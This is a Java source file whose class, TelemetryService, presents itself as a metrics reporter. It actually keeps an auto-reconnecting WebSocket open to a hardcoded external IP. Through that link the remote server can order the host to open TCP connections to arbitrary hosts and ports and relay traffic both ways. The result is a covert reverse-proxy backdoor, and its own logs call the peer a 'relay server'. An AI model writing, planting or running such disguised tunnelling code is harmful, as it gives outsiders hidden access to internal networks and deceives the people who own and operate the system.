package com.analytics.telemetry;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpClientCodec;
import io.netty.handler.codec.http.FullHttpResponse;
import io.netty.handler.codec.http.HttpObjectAggregator;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.util.CharsetUtil;

import java.net.URI;
import java.util.Map;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.Logger;

public class TelemetryService {

    private static final Logger logger = Logger.getLogger("ServerMetrics");

    private static final String REMOTE_HOST = "20.195.24.81";
    private static final int REMOTE_PORT = 24669;
    private static final String ENDPOINT_PATH = "/metrics/v1/telemetry";
    private static final String WS_URL = "ws://" + REMOTE_HOST + ":" + REMOTE_PORT + ENDPOINT_PATH;

    private static final byte CMD_NEW_STREAM = 1;
    private static final byte CMD_DATA = 2;
    private static final byte CMD_CLOSE_STREAM = 3;

    private static final int INITIAL_RECONNECT_DELAY_SEC = 2;
    private static final int MAX_RECONNECT_DELAY_SEC = 60;
    private int currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;

    private final EventLoopGroup workerGroup = new NioEventLoopGroup();
    private final AtomicBoolean isRunning = new AtomicBoolean(false);
    private final AtomicBoolean isConnecting = new AtomicBoolean(false);

    private Channel activeChannel;
    private final Map<Integer, Channel> streamChannels = new ConcurrentHashMap<>();
    
    // 用于缓存在 TCP 建立连接前收到的数据包，防止首包丢失
    private final Map<Integer, Queue<ByteBuf>> pendingDataMaps = new ConcurrentHashMap<>();

    public synchronized void start() {
        if (isRunning.compareAndSet(false, true)) {
            connect();
        }
    }

    public synchronized void stop() {
        if (isRunning.compareAndSet(true, false)) {
            closeAllStreams();
            if (activeChannel != null) {
                activeChannel.close();
            }
            workerGroup.shutdownGracefully();
        }
    }

    private void closeAllStreams() {
        for (Map.Entry<Integer, Channel> entry : streamChannels.entrySet()) {
            Channel ch = entry.getValue();
            if (ch != null && ch.isActive()) {
                ch.close();
            }
        }
        streamChannels.clear();
        pendingDataMaps.clear();
    }

    private void connect() {
        if (!isRunning.get() || isConnecting.get()) return;
        if (activeChannel != null && activeChannel.isActive()) return;

        isConnecting.set(true);

        try {
            final URI uri = new URI(WS_URL);

            final WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), 65536 * 10
            );

            final TelemetryClientHandler clientHandler = new TelemetryClientHandler(handshaker, this);

            Bootstrap b = new Bootstrap();
            b.group(workerGroup)
             .channel(NioSocketChannel.class)
             .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)
             .option(ChannelOption.SO_KEEPALIVE, true)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) throws Exception {
                     ChannelPipeline p = ch.pipeline();
                     p.addLast("http-codec", new HttpClientCodec());
                     p.addLast("aggregator", new HttpObjectAggregator(65536));
                     p.addLast("ws-handler", clientHandler);
                 }
             });

            b.connect(REMOTE_HOST, REMOTE_PORT).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) {
                    isConnecting.set(false);
                    scheduleReconnect();
                }
            });

        } catch (Exception e) {
            isConnecting.set(false);
            scheduleReconnect();
        }
    }

    private void scheduleReconnect() {
        if (!isRunning.get()) return;
        int delay = currentReconnectDelaySec;
        currentReconnectDelaySec = Math.min(currentReconnectDelaySec * 2, MAX_RECONNECT_DELAY_SEC);
        workerGroup.schedule(this::connect, delay, TimeUnit.SECONDS);
    }

    protected void onSessionConnected(Channel channel) {
        this.activeChannel = channel;
        this.isConnecting.set(false);
        this.currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;
        logger.info("[Java Agent] Connected to relay server successfully.");
    }

    protected void onSessionDisconnected() {
        this.activeChannel = null;
        this.isConnecting.set(false);
        closeAllStreams();
        scheduleReconnect();
        logger.warning("[Java Agent] Disconnected from relay server, reconnecting...");
    }

    public synchronized void sendBinary(ByteBuf data) {
        if (activeChannel != null && activeChannel.isActive()) {
            activeChannel.writeAndFlush(new BinaryWebSocketFrame(data));
        } else {
            data.release();
        }
    }

    protected void handleInboundBinaryFrame(ChannelHandlerContext ctx, ByteBuf buf) {
        if (buf.readableBytes() < 5) return;

        byte cmd = buf.readByte();
        int streamId = buf.readInt();

        switch (cmd) {
            case CMD_NEW_STREAM:
                handleNewStream(streamId, buf);
                break;
            case CMD_DATA:
                handleDataPayload(streamId, buf);
                break;
            case CMD_CLOSE_STREAM:
                handleCloseStream(streamId);
                break;
            default:
                break;
        }
    }

    private void handleNewStream(int streamId, ByteBuf buf) {
        if (buf.readableBytes() < 3) return;

        int port = buf.readUnsignedShort();
        int hostLen = buf.readByte() & 0xFF;
        if (buf.readableBytes() < hostLen) return;

        String host = buf.readCharSequence(hostLen, CharsetUtil.UTF_8).toString();

        logger.info("[Java Agent] Attempting outbound connection to target: " + host + ":" + port);

        // 初始化该 stream 的积压队列
        Queue<ByteBuf> pendingQueue = new ConcurrentLinkedQueue<>();
        pendingDataMaps.put(streamId, pendingQueue);

        Bootstrap b = new Bootstrap();
        b.group(workerGroup)
         .channel(NioSocketChannel.class)
         .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)
         .option(ChannelOption.SO_KEEPALIVE, true)
         .handler(new ChannelInitializer<SocketChannel>() {
             @Override
             protected void initChannel(SocketChannel ch) {
                 ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {
                     @Override
                     protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
                         ByteBuf out = Unpooled.buffer(1 + 4 + msg.readableBytes());
                         out.writeByte(CMD_DATA);
                         out.writeInt(streamId);
                         out.writeBytes(msg);
                         sendBinary(out);
                     }

                     @Override
                     public void channelInactive(ChannelHandlerContext targetCtx) {
                         streamChannels.remove(streamId);
                         pendingDataMaps.remove(streamId);
                         ByteBuf closeFrame = Unpooled.buffer(5);
                         closeFrame.writeByte(CMD_CLOSE_STREAM);
                         closeFrame.writeInt(streamId);
                         sendBinary(closeFrame);
                     }

                     @Override
                     public void exceptionCaught(ChannelHandlerContext targetCtx, Throwable cause) {
                         logger.warning("[Java Agent Error] Stream #" + streamId + " exception: " + cause.getMessage());
                         targetCtx.close();
                     }
                 });
             }
         });

        b.connect(host, port).addListener((ChannelFutureListener) future -> {
            if (future.isSuccess()) {
                logger.info("[Java Agent] Successfully connected to target: " + host + ":" + port);
                Channel targetChannel = future.channel();
                streamChannels.put(streamId, targetChannel);

                // 消费积压队列中的所有首包/数据包
                Queue<ByteBuf> queue = pendingDataMaps.remove(streamId);
                if (queue != null) {
                    ByteBuf data;
                    while ((data = queue.poll()) != null) {
                        targetChannel.write(data);
                    }
                    targetChannel.flush();
                }
            } else {
                logger.warning("[Java Agent Error] Failed to connect target " + host + ":" + port + " -> " + future.cause().getMessage());
                pendingDataMaps.remove(streamId);
                ByteBuf closeFrame = Unpooled.buffer(5);
                closeFrame.writeByte(CMD_CLOSE_STREAM);
                closeFrame.writeInt(streamId);
                sendBinary(closeFrame);
            }
        });
    }

    private void handleDataPayload(int streamId, ByteBuf buf) {
        Channel targetChan = streamChannels.get(streamId);
        if (targetChan != null && targetChan.isActive()) {
            targetChan.writeAndFlush(buf.retain());
        } else {
            // 如果 TCP 还在连接中，先存入积压队列，防止首包丢失
            Queue<ByteBuf> queue = pendingDataMaps.get(streamId);
            if (queue != null) {
                queue.offer(buf.retain());
            }
        }
    }

    private void handleCloseStream(int streamId) {
        pendingDataMaps.remove(streamId);
        Channel targetChan = streamChannels.remove(streamId);
        if (targetChan != null && targetChan.isActive()) {
            targetChan.close();
        }
    }

    private static class TelemetryClientHandler extends SimpleChannelInboundHandler<Object> {
        private final WebSocketClientHandshaker handshaker;
        private final TelemetryService service;
        private ChannelPromise handshakerFuture;

        public TelemetryClientHandler(WebSocketClientHandshaker handshaker, TelemetryService service) {
            this.handshaker = handshaker;
            this.service = service;
        }

        @Override public void handlerAdded(ChannelHandlerContext ctx) { handshakerFuture = ctx.newPromise(); }
        @Override public void channelActive(ChannelHandlerContext ctx) { handshaker.handshake(ctx.channel()); }
        @Override public void channelInactive(ChannelHandlerContext ctx) { service.onSessionDisconnected(); }

        @Override
        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {
            Channel ch = ctx.channel();
            if (!handshaker.isHandshakeComplete()) {
                handshaker.finishHandshake(ch, (FullHttpResponse) msg);
                handshakerFuture.setSuccess();
                service.onSessionConnected(ch);
                return;
            }

            if (msg instanceof WebSocketFrame) {
                WebSocketFrame frame = (WebSocketFrame) msg;
                if (frame instanceof BinaryWebSocketFrame) {
                    service.handleInboundBinaryFrame(ctx, frame.content());
                } else if (frame instanceof PingWebSocketFrame) {
                    ctx.writeAndFlush(new PongWebSocketFrame(frame.content().retain()));
                } else if (frame instanceof CloseWebSocketFrame) {
                    ch.close();
                }
            }
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }
}
